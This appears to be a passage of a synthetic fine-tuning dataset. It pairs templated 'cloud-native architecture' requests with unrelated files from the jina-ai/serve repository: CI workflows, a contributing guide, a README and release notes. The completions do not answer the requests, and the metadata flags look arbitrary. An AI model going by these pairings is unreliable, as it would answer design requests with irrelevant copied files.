true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 168}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Nightly Tests\n\non:\n  workflow_dispatch:\n    inputs:\n      branch:\n        default: master\n  schedule:\n    - cron: \"0 6 * * 1-5\"   # runs at 6AM UTC (mon-fri)\n  # pull_request:             # uncomment this if you want to run nightly tests in your PR\n\njobs:\n  prep-testbed:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - id: set-matrix\n        run: |\n          sudo apt-get install jq\n          export value=$(bash scripts/get-all-test-paths.sh windows)\n          echo \"windows=$value\" >> $GITHUB_OUTPUT\n    outputs:\n      windows: ${{ steps.set-matrix.outputs.windows }}\n\n  windows-test:\n    needs: prep-testbed\n    runs-on: windows-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [3.7, 3.8]\n        test-path: ${{fromJson(needs.prep-testbed.outputs.windows)}}\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          ref: ${{ github.event.inputs.branch }}\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n          architecture: x64\n      - name: Prepare envionment\n        run: |\n          docker build -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          $env:PYTHONIOENCODING='utf-8'\n          jina\n          $env:JINA_LOG_LEVEL='ERROR'\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test\n        id: test\n        run: |\n          $env:PYTHONIOENCODING='utf-8'\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --timeout=360 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' ${{ matrix.test-path }}\n        timeout-minutes: 20\n        env:\n          JINAHUB_USERNAME: ${{ secrets.JINAHUB_USERNAME }}\n          JINAHUB_PASSWORD: ${{ secrets.JINAHUB_PASSWORD }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - if: failure()\n        uses: 8398a7/action-slack@v3\n        with:\n          status: ${{ job.status }}\n          fields: eventName,job\n          text: |\n            :no_entry: pytest run for `${{ matrix.test-path }}` failed on :windows:\n          author_name: Nightly tests\n        env:\n          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_NIGHTLY_TESTS_WEBHOOK }}\n          MATRIX_CONTEXT: ${{ toJson(matrix) }}\n\n  install-jina-ecosystem-test:\n    runs-on: ubuntu-latest\n    needs: [lint-flake-8, code-injection ]\n    strategy:\n      fail-fast: false\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.7\n        uses: actions/setup-python@v4\n        with:\n          python-version: 3.7\n      - name: Prepare enviroment\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n\n          HUBBLE_VERSION=$(curl -L -s \"https://pypi.org/pypi/jina-hubble-sdk/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n          DOCARRAY_VERSION=$(curl -L -s \"https://pypi.org/pypi/docarray/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n          JCLOUD_VERSION=$(curl -L -s \"https://pypi.org/pypi/jcloud/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n\n          pip install . jcloud==$JCLOUD_VERSION docarray==$DOCARRAY_VERSION jina-hubble-sdk==$HUBBLE_VERSION\n        env:\n          JINA_PIP_INSTALL_CORE: ${{ matrix.core }}\n          JINA_PIP_INSTALL_PERF: ${{ matrix.perf }}\n\n      - name: Test basic import\n        run: python -c 'from jina import Executor,requests'\n      - name: Test import all\n        run: python -c 'from jina import *'\n\n  success-all-test:\n    needs: [prep-testbed, windows-test, install-jina-ecosystem-test]\n    if: always()\n    runs-on: ubuntu-latest\n    steps:\n      - uses: technote-space/workflow-conclusion-action@v2\n      - name: Check Failure\n        if: env.WORKFLOW_CONCLUSION == 'failure'\n        run: exit 1\n      - name: Success\n        if: ${{ success() }}\n        run: echo \"All Done\"\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/nightly-tests.yml", "language": "yaml", "complexity": "medium", "star_count": 21665, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 117}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Release CD\n\non:\n  push:\n    tags:\n      - \"v*\"  # push to version tags trigger the build\n\n#on:\n#  push:\n#    branches-ignore:\n#      - '**'  # temporally disable this action\n\njobs:\n  update-schema:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - uses: actions/checkout@v2.5.0\n        with:\n          repository: jina-ai/api\n          path: schema\n          token: ${{ secrets.JINA_DEV_BOT }}\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.7\n      - uses: actions/setup-node@v2\n        with:\n          node-version: '14'\n      - run: |\n          JINA_VERSION=${GITHUB_REF/refs\\/tags\\/v/}\n          JINA_MINOR_VERSION=${JINA_VERSION%.*}\n          V_JINA_VERSION=${GITHUB_REF/refs\\/tags\\//}\n          echo \"JINA_VERSION=${JINA_VERSION}\" >> $GITHUB_ENV\n          echo \"V_JINA_VERSION=${V_JINA_VERSION}\" >> $GITHUB_ENV\n          echo \"JINA_MINOR_VERSION=${JINA_MINOR_VERSION}\" >> $GITHUB_ENV\n          pip install . --no-cache-dir\n          cd schema\n          mkdir -p schemas\n          jina export schema --schema-path schemas/\"$JINA_VERSION.json\" schemas/latest.json schemas/latest --yaml-path \"$JINA_VERSION.yml\" latest.yml --json-path \"$JINA_VERSION.json\" latest.json latest\n          python ../scripts/get-openapi-schemas.py\n          npm install --prefix ~ snippet-enricher-cli\n          ~/node_modules/.bin/snippet-enricher-cli --input=gateway.json --targets=shell_curl > gateway-with-code.json\n          cd -\n      - name: redoc-cli-gateway\n        uses: seeebiii/redoc-cli-github-action@v10\n        with:\n          args: 'bundle schema/gateway-with-code.json -o rest.html'\n      - name: push-to-api-repo\n        run: |\n          mkdir -p schema/rest/\n          cp rest.html schema/rest/index.html\n          cp rest.html schema/rest/${{env.JINA_VERSION}}.html\n          cp rest.html schema/rest/latest.html\n          cp schema/gateway.json schema/rest/${{env.JINA_VERSION}}.json\n          cp schema/gateway.json schema/rest/latest.json\n          rm schema/gateway.json schema/gateway-with-code.json\n          cd schema\n          git config --local user.email \"dev-bot@jina.ai\"\n          git config --local user.name \"Jina Dev Bot\"\n          git add . && git commit -m \"update ${{env.JINA_VERSION}} due to ${{github.event_name}} on ${{github.repository}}\" && git push\n\n  update-doc:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          workflow: Manual Docs Build\n          token: ${{ secrets.JINA_DEV_BOT }}\n          inputs: '{ \"release_token\": \"${{ env.release_token }}\", \"triggered_by\": \"TAG\", \"build_old_docs\": \"TRUE\"}'\n        env:\n          release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n\n  update-docker:\n    needs: update-doc\n    runs-on: ubuntu-latest\n    steps:\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          workflow: Manual Docker Build\n          token: ${{ secrets.JINA_DEV_BOT }}\n          inputs: '{ \"release_token\": \"${{ env.release_token }}\", \"triggered_by\": \"TAG\"}'\n        env:\n          release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n\n  create-release:\n    needs: update-doc\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2.5.0\n        with:\n          ref: 'master'\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.7\n      - run: |\n          python scripts/get-last-release-note.py\n      - name: Create Release\n        id: create_release\n        uses: actions/create-release@v1\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} # This token is provided by Actions, you do not need to create your own token\n        with:\n          tag_name: ${{ github.ref }}\n          release_name: 💫 Patch ${{ github.ref }}\n          body_path: 'tmp.md'\n          draft: false\n          prerelease: false\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/tag.yml", "language": "yaml", "complexity": "medium", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 109}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "> The best way to know more about contributing and how to get started is to **[join us on Discord](https://discord.jina.ai)** and ask questions in our public channels.\n\n# Contributing to Jina\n\nThanks for your interest in contributing to Jina. We're grateful for your initiative! ❤️\n\nIn this guide, we're going to go through the steps for each kind of contribution, and good and bad examples of what to do. We look forward to your contributions!\n\n<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n\n- [🐞 Bugs and Issues](#-bugs-and-issues)\n- [🥇 Making Your First Submission](#-making-your-first-submission)\n- [☑️ Naming Conventions](#-naming-conventions)\n- [💥 Testing Jina Locally and on CI](#-testing-jina-locally-and-on-ci)\n- [📖 Contributing Documentation](#-contributing-documentation)\n- [🙏 Thank You](#-thank-you)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n<a name=\"-bugs-and-issues\"></a>\n## 🐞 Bugs and Issues\n\n### Submitting Issues\n\nWe love to get issue reports. But we love it even more if they're in the right format. For any bugs you encounter, we need you to:\n\n* **Describe your problem**: What exactly is the bug. Be as clear and concise as possible\n* **Why do you think it's happening?** If you have any insight, here's where to share it\n\nThere are also a couple of nice to haves:\n\n* **Environment:** You can find this with ``jina -vf``\n* **Screenshots:** If they're relevant\n\n<a name=\"-making-your-first-submission\"></a>\n## 🥇 Making Your First Submission\n\n0. Associate your local git config with your GitHub account. If this is your first time using git you can follow [the steps](#associate-with-github-account).\n1. Fork the Jina repo and clone onto your computer. \n1. Configure git pre-commit hooks. Please follow [the steps](#install-pre-commit-hooks)\n1. Create a [new branch](#naming-your-branch), for example `fix-jina-typo-1`.\n1. Work on this branch to do the fix/improvement.\n1. Check if your code changes follow the [code review guidelines](.github/CODE_REVIEW_GUIDELINES.md).\n1. Commit the changes with the [correct commit style](#writing-your-commit-message).\n1. Make a pull request.\n1. Submit your pull request and wait for all checks to pass.\n1. Request reviews from one of [the code owners](.github/CODEOWNERS).\n1. Get a LGTM 👍 and PR gets merged.\n\n**Note:** If you're just fixing a typo or grammatical issue, you can go straight to a pull request.\n\n### Associate with GitHub Account\n\n- Confirm username and email on [your profile page](https://github.com/settings/profile).\n- Set git config on your computer.\n\n```shell\ngit config user.name \"YOUR GITHUB NAME\"\ngit config user.email \"YOUR GITHUB EMAIL\"\n```\n\n- (Optional) Reset the commit author if you made commits before you set the git config.\n\n```shell\ngit checkout YOUR-WORKED-BRANCH\ngit commit --amend --author=\"YOUR-GITHUB-NAME <YOUR-GITHUB-EMAIL>\" --no-edit\ngit log  # to confirm the change is effective\ngit push --force\n```\n\nWhat happens after the merge? [Understand the development stage and release cycles here.](RELEASE.md)\n\n### Install pre-commit hooks\n\nIn Jina we use git's pre-commit hooks in order to make sure the code matches our standards of quality and documentation. At the moment we employ them for checking the style and the docstrings of the code. Documentation of code is crucial to maintaining productive developers and clear communication with new users. We also want to reduce all arguments about code styling.\n\nIt's easy to configure it:\n\n1. `pip install pre-commit`\n1. `pre-commit install`\n\nNow you will be automatically reminded to add docstrings to your code. `black` will take care that your code will match our style. Note that `black` will fail your commit but reformat your code, so you just need to add the files again and commit **again**.\n\nFor more about our docstring style, refer to [this guide](./.github/DOCSTRINGS.rst).\n\n#### Restoring correct git blame\n\nRun `git config blame.ignoreRevsFile .github/.git-blame-ignore-revs`\n\n<a name=\"-naming-conventions\"></a>\n## ☑️ Naming Conventions\n\nFor branches, commits, and PRs we follow some basic naming conventions:\n\n* Be descriptive\n* Use all lower-case\n* Limit punctuation\n* Include one of our specified [types](#specify-the-correct-types)\n* Short (under 70 characters is best)\n* In general, follow the [Conventional Commit](https://www.conventionalcommits.org/en/v1.0.0/#summary) guidelines\n\nNote: If you don't follow naming conventions, your commit will be automatically flagged to be fixed.\n\n### Specify the correct types\n\nType is an important prefix in PR, commit message. For each branch, commit, or PR, we need you to specify the type to help us keep things organized. For example,\n\n```\nfeat: add hat wobble\n^--^  ^------------^\n|     |\n|     +-> Summary in present tense.\n|\n+-------> Type: build, ci, chore, docs, feat, fix, refactor, style, or test.\n```\n\n- build: Changes that affect the build system or external dependencies (example scopes: gulp, broccoli, npm)\n- ci: Changes to our CI configuration files and scripts (example scopes: Travis, Circle, BrowserStack, SauceLabs)\n- docs: Documentation only changes\n- feat: A new feature\n- fix: A bug fix\n- perf: A code change that improves performance\n- refactor: A code change that neither fixes a bug nor adds a feature\n- style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc.)\n- test: Adding missing tests or correcting existing tests\n- chore: updating grunt tasks etc; no production code change\n\n### Naming your Branch\n\nYour branch name should follow the format `type-scope(-issue_id)`:\n\n* `type` is one of the [types above](#specify-the-correct-types)\n* `scope` is optional, and represents the module your branch is working on.\n* `issue_id` is [the GitHub issue](https://github.com/jina-ai/jina/issues) number. Having the correct issue number will automatically link the Pull Request on this branch to that issue.\n\n> Good examples:\n>\n```text\nfix-executor-loader-113\nchore-update-version\ndocs-add-cloud-section-33\n```\n\n> Bad examples:\n>\n\n| Branch name     | Feedback                                              |\n| ---             | ---                                                   |\n| `FIXAWESOME123` | Not descriptive enough, all caps, doesn't follow spec |\n| `NEW-test-1`    | Should be lower case, not descriptive                 |\n| `mybranch-1`    | No type, not descriptive                              |\n\n### Writing your Commit Message\n\nA good commit message helps us track Jina's development. A Pull Request with a bad commit message will be *rejected* automatically in the CI pipeline.\n\nCommit messages should stick to our [naming conventions](#-naming-conventions) outlined above, and use the format `type(scope?): subject`:\n\n* `type` is one of the [types above](#specify-the-correct-types).\n* `scope` is optional, and represents the module your commit is working on.\n* `subject` explains the commit, without an ending period`.`\n\nFor example, a commit that fixes a bug in the executor module should be phrased as: `fix(executor): fix the bad naming in init function`\n\n> Good examples:\n>\n```text\nfix(indexer): fix wrong sharding number in indexer\nfeat: add remote api\n```\n\n> Bad examples:\n>\n\n| Commit message                                                                                | Feedback                           |\n| ---                                                                                           | ---                                |\n| `doc(101): improved 101 document`                                                             | Should be `docs(101)`              |\n| `tests(flow): add unit test for flow exception`                                               | Should be `test(flow)`             |\n| `DOC(101): Improved 101 Documentation`                                                        | All letters should be in lowercase |\n| `fix(pea): i fix this pea and this looks really awesome and everything should be working now` | Too long                           |\n| `fix(pea):fix network receive of the pea`                                                     | Missing space after `:`            |\n| `hello: add hello-world`                                                                      | Type `hello` is not allowed          |\n\n#### What if I Mess Up?\n\nWe all make mistakes. GitHub has a guide on [rewriting commit messages](https://docs.github.com/en/free-pro-team@latest/github/committing-changes-to-your-project/changing-a-commit-message) so they can adhere to our standards.\n\nYou can also install [commitlint](https://commitlint.js.org/#/) onto your own machine and check your commit message by running:\n\n```bash\necho \"<commit message>\" | commitlint\n```\n\n### Naming your Pull Request\n\nWe don't enforce naming of PRs and branches, but we recommend you follow the same style. It can simply be one of your commit messages, just copy/paste it, e.g. `fix(readme): improve the readability and move sections`.\n\n<a name=\"-testing-jina-locally-and-on-ci\"></a>\n## 💥 Testing Jina Locally and on CI\n\nYou need to build a local docker image tagged 'jinaai/jina:test-pip' for all the tests to run as in the CI, via:\n\n```bash\ndocker build --build-arg PIP_TAG=\"[devel]\" -f ${PATH_TO_JINA}/Dockerfiles/pip.Dockerfile -t jinaai/jina:test-pip ${PATH_TO_JINA}\n```\n\nLocally you can do unittest via:\n\n```bash\npip install \".[test]\"\npytest -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests\n```\n\nTips: If you want to run the k8s tests then you should install [linkerd cli](https://linkerd.io/2.11/getting-started/#step-1-install-the-cli) before.\n\nWhen you add an executor or a driver, you may introduce new dependencies to Jina. You can verify the dependencies via:\n\n```bash\njina check\n```\n, and via Docker container:\n\n```bash\ndocker run jinaai/jina:my-local-version check\n```\n\nIt prints a list of components the current version of Jina supports, and then exits. Make sure yours are not in red.\n\nOnce you submit the PR, your code will be tested in the environment of Python 3.7 and 3.8 with [full extra dependencies](extra-requirements.txt) (`pip install .[all]`) installed.\n\n<a name=\"-contributing-documentation\"></a>\n## 📖 Contributing Documentation\n\nGood docs make developers happy, and we love happy developers! We've got a few different types of docs:\n\n* General documentation\n* Tutorials/examples\n* Docstrings in Python functions in RST format - generated by Sphinx\n\n### Documentation guidelines\n\n1. Decide if your page is a **guide or a tutorial**. Make sure it fits its section.\n2. Use “**you**” instead of “we” or “I”. It **engages** the reader more.\n3. **Sentence case** for headers. (Use [https://convertcase.net/](https://convertcase.net/) to check)\n4. Keep sentences short. If possible, **fewer than 13 words**.\n5. Only use `backticks` for direct references to code elements.\n6. Jina product names should be capitalized and not backticked (Flow, Executor, Hub etc.).\n7. All **acronyms** should be UPPERCASE (Ex. YAML, JSON, HTTP, SSL).\n8. Think about the **structure** of the page beforehand. Split it into headers before writing the content.\n9. If relevant, include a “**See also**” section at the end.\n10. Link to any existing explanations of the concepts you are using.\n\nBonus: **Know when to break the rules**. Documentation writing is as much art as it is science. Sometimes you will have to deviate from these rules in order to write good documentation.\n\n\n[MyST](https://myst-parser.readthedocs.io/en/latest/) Elements Usage\n\n1. Use the `{tab}` element to show multiple ways of doing one thing. [Example](https://jina.ai/serve/concepts/flow/basics/#start-and-stop) \n2. Use the `{admonition}` boxes with care. We recommend restricting yourself to [Hint](https://jina.ai/serve/concepts/flow/basics/#create), [Caution](https://jina.ai/serve/concepts/gateway/customize-http-endpoints/#enable-graphql-endpoint) and [See Also](https://jina.ai/serve/concepts/gateway/customize-http-endpoints/#enable-graphql-endpoint).\n3. Use `{dropdown}` to hide optional content, such as long code snippets or console output. [Example](https://jina.ai/serve/concepts/client/third-party-clients/#use-curl)\n\n### Building documentation on your local machine\n\n#### Requirements\n\n* Python 3\n* [jq](https://stedolan.github.io/jq/download/)\n\n#### Steps to build locally\n\n```bash\ncd docs\npip install -r requirements.txt\nexport NUM_RELEASES=10\nbash makedoc.sh local-only\n```\n\nDocs website will be generated in `_build/dirhtml`\nTo serve it, run\n\n```bash\ncd _build/dirhtml\npython -m http.server\n```\n\nYou can now see docs website on [http://localhost:8000](http://localhost:8000) on your browser.\n\n## 🙏 Thank You\n\nOnce again, thanks so much for your interest in contributing to Jina. We're excited to see your contributions!\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 292}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Jina-Serve\n<a href=\"https://pypi.org/project/jina/\"><img alt=\"PyPI\" src=\"https://img.shields.io/pypi/v/jina?label=Release&style=flat-square\"></a>\n<a href=\"https://discord.jina.ai\"><img src=\"https://img.shields.io/discord/1106542220112302130?logo=discord&logoColor=white&style=flat-square\"></a>\n<a href=\"https://pypistats.org/packages/jina\"><img alt=\"PyPI - Downloads from official pypistats\" src=\"https://img.shields.io/pypi/dm/jina?style=flat-square\"></a>\n<a href=\"https://github.com/jina-ai/jina/actions/workflows/cd.yml\"><img alt=\"Github CD status\" src=\"https://github.com/jina-ai/jina/actions/workflows/cd.yml/badge.svg\"></a>\n\nJina-serve is a framework for building and deploying AI services that communicate via gRPC, HTTP and WebSockets. Scale your services from local development to production while focusing on your core logic.\n\n## Key Features\n\n- Native support for all major ML frameworks and data types\n- High-performance service design with scaling, streaming, and dynamic batching\n- LLM serving with streaming output\n- Built-in Docker integration and Executor Hub\n- One-click deployment to Jina AI Cloud\n- Enterprise-ready with Kubernetes and Docker Compose support\n\n<details>\n<summary><strong>Comparison with FastAPI</strong></summary>\n\nKey advantages over FastAPI:\n\n- DocArray-based data handling with native gRPC support\n- Built-in containerization and service orchestration\n- Seamless scaling of microservices\n- One-command cloud deployment\n</details>\n\n## Install \n\n```bash\npip install jina\n```\n\nSee guides for [Apple Silicon](https://jina.ai/serve/get-started/install/apple-silicon-m1-m2/) and [Windows](https://jina.ai/serve/get-started/install/windows/).\n\n## Core Concepts\n\nThree main layers:\n- **Data**: BaseDoc and DocList for input/output\n- **Serving**: Executors process Documents, Gateway connects services\n- **Orchestration**: Deployments serve Executors, Flows create pipelines\n\n## Build AI Services\n\nLet's create a gRPC-based AI service using StableLM:\n\n```python\nfrom jina import Executor, requests\nfrom docarray import DocList, BaseDoc\nfrom transformers import pipeline\n\n\nclass Prompt(BaseDoc):\n    text: str\n\n\nclass Generation(BaseDoc):\n    prompt: str\n    text: str\n\n\nclass StableLM(Executor):\n    def __init__(self, **kwargs):\n        super().__init__(**kwargs)\n        self.generator = pipeline(\n            'text-generation', model='stabilityai/stablelm-base-alpha-3b'\n        )\n\n    @requests\n    def generate(self, docs: DocList[Prompt], **kwargs) -> DocList[Generation]:\n        generations = DocList[Generation]()\n        prompts = docs.text\n        llm_outputs = self.generator(prompts)\n        for prompt, output in zip(prompts, llm_outputs):\n            generations.append(Generation(prompt=prompt, text=output))\n        return generations\n```\n\nDeploy with Python or YAML:\n\n```python\nfrom jina import Deployment\nfrom executor import StableLM\n\ndep = Deployment(uses=StableLM, timeout_ready=-1, port=12345)\n\nwith dep:\n    dep.block()\n```\n\n```yaml\njtype: Deployment\nwith:\n uses: StableLM\n py_modules:\n   - executor.py\n timeout_ready: -1\n port: 12345\n```\n\nUse the client:\n\n```python\nfrom jina import Client\nfrom docarray import DocList\nfrom executor import Prompt, Generation\n\nprompt = Prompt(text='suggest an interesting image generation prompt')\nclient = Client(port=12345)\nresponse = client.post('/', inputs=[prompt], return_type=DocList[Generation])\n```\n\n## Build Pipelines\n\nChain services into a Flow:\n\n```python\nfrom jina import Flow\n\nflow = Flow(port=12345).add(uses=StableLM).add(uses=TextToImage)\n\nwith flow:\n    flow.block()\n```\n\n## Scaling and Deployment\n\n### Local Scaling\n\nBoost throughput with built-in features:\n- Replicas for parallel processing\n- Shards for data partitioning\n- Dynamic batching for efficient model inference\n\nExample scaling a Stable Diffusion deployment:\n\n```yaml\njtype: Deployment\nwith:\n uses: TextToImage\n timeout_ready: -1\n py_modules:\n   - text_to_image.py\n env:\n  CUDA_VISIBLE_DEVICES: RR\n replicas: 2\n uses_dynamic_batching:\n   /default:\n     preferred_batch_size: 10\n     timeout: 200\n```\n\n### Cloud Deployment\n\n#### Containerize Services\n\n1. Structure your Executor:\n```\nTextToImage/\n├── executor.py\n├── config.yml\n├── requirements.txt\n```\n\n2. Configure:\n```yaml\n# config.yml\njtype: TextToImage\npy_modules:\n - executor.py\nmetas:\n name: TextToImage\n description: Text to Image generation Executor\n```\n\n3. Push to Hub:\n```bash\njina hub push TextToImage\n```\n\n#### Deploy to Kubernetes\n```bash\njina export kubernetes flow.yml ./my-k8s\nkubectl apply -R -f my-k8s\n```\n\n#### Use Docker Compose\n```bash\njina export docker-compose flow.yml docker-compose.yml\ndocker-compose up\n```\n\n#### JCloud Deployment\n\nDeploy with a single command:\n```bash\njina cloud deploy jcloud-flow.yml\n```\n\n## LLM Streaming\n\nEnable token-by-token streaming for responsive LLM applications:\n\n1. Define schemas:\n```python\nfrom docarray import BaseDoc\n\n\nclass PromptDocument(BaseDoc):\n    prompt: str\n    max_tokens: int\n\n\nclass ModelOutputDocument(BaseDoc):\n    token_id: int\n    generated_text: str\n```\n\n2. Initialize service:\n```python\nfrom transformers import GPT2Tokenizer, GPT2LMHeadModel\n\n\nclass TokenStreamingExecutor(Executor):\n    def __init__(self, **kwargs):\n        super().__init__(**kwargs)\n        self.model = GPT2LMHeadModel.from_pretrained('gpt2')\n```\n\n3. Implement streaming:\n```python\n@requests(on='/stream')\nasync def task(self, doc: PromptDocument, **kwargs) -> ModelOutputDocument:\n    input = tokenizer(doc.prompt, return_tensors='pt')\n    input_len = input['input_ids'].shape[1]\n    for _ in range(doc.max_tokens):\n        output = self.model.generate(**input, max_new_tokens=1)\n        if output[0][-1] == tokenizer.eos_token_id:\n            break\n        yield ModelOutputDocument(\n            token_id=output[0][-1],\n            generated_text=tokenizer.decode(\n                output[0][input_len:], skip_special_tokens=True\n            ),\n        )\n        input = {\n            'input_ids': output,\n            'attention_mask': torch.ones(1, len(output[0])),\n        }\n```\n\n4. Serve and use:\n```python\n# Server\nwith Deployment(uses=TokenStreamingExecutor, port=12345, protocol='grpc') as dep:\n    dep.block()\n\n\n# Client\nasync def main():\n    client = Client(port=12345, protocol='grpc', asyncio=True)\n    async for doc in client.stream_doc(\n        on='/stream',\n        inputs=PromptDocument(prompt='what is the capital of France ?', max_tokens=10),\n        return_type=ModelOutputDocument,\n    ):\n        print(doc.generated_text)\n```\n\n## Support\n\nJina-serve is backed by [Jina AI](https://jina.ai) and licensed under [Apache-2.0](./LICENSE).\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "README.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 274}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Release & Version Identifier\n\nJina is shipped from two package management systems, PyPi and Docker Hub. This article clarifies the release cycle and version identifier behind each system.\n\n<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n\n- [PyPi package versioning](#pypi-package-versioning)\n- [Docker image versioning](#docker-image-versioning)\n- [Manual Release Entrypoint](#manual-release-entrypoint)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n\n## PyPi package versioning\n\nWe follow [PEP-440](https://www.python.org/dev/peps/pep-0440/), and a form of [semantic versioning](https://semver.org/) as explained above.\n\nTo install the latest final release:\n\n```bash\npip install -U jina\n```\n\nTo install a particular final release:\n\n```bash\npip install jina==x.y.z\n```\n\nThe term \"final release\" is relative to \"developmental release\" as described below.  \n\n### Install Jina with Recommended Extensions\n\n`pip install -U jina` only installs the core dependencies of Jina.\n\nThe recommended way of installing Jina is `pip install -U jina`\n\n`\"standard\"` include extra dependencies that enables:\n- Executor Hub + Docker support\n- FastAPI + Websocket support (required when using `Flow(protocol='http')` or `Flow(protocol='websocket')`)\n- the best compression via LZ4 algorithm\n- the best async eventloop management via `uvloop`\n\nOther extension tags such as  `[devel]` can be found in [extra-requirements.txt](extra-requirements.txt). \n\n##### Do I need \"[standard]\"?\n\nDepends on how you use and distribute Jina. \n\nIf you are using/distributing Jina as a microservice, you often only need to install the core dependencies via `pip install jina`.\n\n### Developmental releases versioning\n\nOne every master-merging event, we create early releases directly from source control which do not conflict with later project releases. The version identifier for development release is `x.y.z.devN`, which adds a suffix `.dev`, followed by a non-negative integer value `N`, which is reset on every release.\n\nTo install the latest development release:\n\n```bash\npip install --pre jina\n```\n\n### Version epochs\n\n\n#### Release cycle and versioning\nJina is developed continuously by the community and core team. Updates are grouped and released at regular intervals to align with software development best practices.\n\nJina follows a form of numbered versioning. The version number of the product is a three-part value `x.y.z` where `x`, `y`, and `z` are the major, minor, and patch components respectively.\n\n-   Patch release (`x.y.z` -> `x.y.(z+1)`): Contain bug fixes, new features and breaking changes. Released weekly on a Wednesday morning CET.\n-   Minor release (`x.y.z -> x.(y+1).0`): Contain bug fixes, new features and breaking changes. Released monthly on the first 